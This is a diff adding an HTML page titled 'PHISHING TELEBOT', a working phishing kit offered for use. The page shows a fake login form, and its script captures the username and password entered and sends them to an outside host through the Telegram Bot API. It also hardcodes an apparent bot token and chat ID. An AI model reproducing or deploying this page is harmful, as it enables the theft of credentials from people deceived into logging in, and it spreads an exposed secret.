@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>PHISHING TELEBOT</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Mochiy+Pop+One&display=swap');
+        body {
+            background-color: #2b2929;
+            display: flex;
+            color: white;
+            flex-direction: column;
+            justify-content: center;
+            padding: 4rem;
+            align-items: center;
+            font-family: 'Lucida Sans', sans-serif;
+        }
+        .header {
+            font-family: 'Mochiy Pop One', sans-serif;
+        }
+        #loginForm {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            gap: 0.5rem;
+            margin: 2rem;
+            width: fit-content;
+        }
+        .loginbtn {
+            margin-top: 10px;
+            padding: 3px;
+            border-radius: 1rem;
+            background: #d5f365;
+            border: none;
+            width: 6rem;
+            height: 30px;
+            color: black;
+            font-family: inherit;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.4s;
+        }
+
+        .loginbtn:hover {
+            box-shadow: 2px 5px 30px -10px #C3D900;
+        }
+
+        .loginbtn:active {
+            transform: scale(0.97);
+            box-shadow: 2px 5px 30px -10px #C3D900;
+        }
+
+        .input {
+            background-color: #ededed;
+            height: 10px;
+            padding: 10px 20px;
+            border: 1px solid white;
+            border-radius: 1rem;
+        }
+
+        .input:focus {
+            color: white;
+            background-color: #2b2929;
+            outline-color: #d5f365;
+            box-shadow: -3px -3px 15px #d5f365;
+            transition: .1s;
+            transition-property: box-shadow;
+        }
+
+        footer {
+            padding: 10px;
+            text-align: center;
+            position: sticky;
+            bottom: 0;
+            margin-top: 45%;
+            font-family: 'Mochiy Pop One', sans-serif;
+            font-size: 10px;
+        }
+
+    </style>
+</head>
+<body>
+    <div class="header">Telegram Bot For Phishing</div>
+    <form id="loginForm">
+        <input
+            class="input"
+            type="text"
+            id="username"
+            name="username"
+            placeholder="Username"
+            required
+            autocomplete="on"
+        />
+        <input
+            class="input"
+            type="password"
+            id="password"
+            name="password"
+            placeholder="Password"
+            required
+            autocomplete="on"
+        />
+        <input class="loginbtn" type="submit" value="Login" />
+    </form>
+    <footer>
+        <p>Iamjinx all copyrights reserved | 2023</p>
+    </footer>
+    <script>
+        document
+            .getElementById("loginForm")
+            .addEventListener("submit", function (event) {
+            event.preventDefault(); // Prevent form submission
+
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            const API_KEY = "5121124155:AAGpVpxlJY-WZlkzStWRIKNfVuj-F3gaY9s";
+            const telegramid = "1841030432";
+
+            const text = encodeURIComponent(`
+ACC DATABASE \n
+USERNAME: \`${username}\`
+PASSWORD: \`${password}\`\n`);
+
+            const url = `https://api.telegram.org/bot${API_KEY}/sendMessage?chat_id=${telegramid}&text=${text}&parse_mode=markdown`;
+
+            fetch(url)
+                .then((response) => response.json())
+                .then((data) => {
+                console.log(data);
+                // Handle the response data here
+                })
+                .catch((error) => {
+                console.error(error);
+                // Handle any errors that occurred during the request
+                });
+            });
+    </script>
+</body>
+</html>
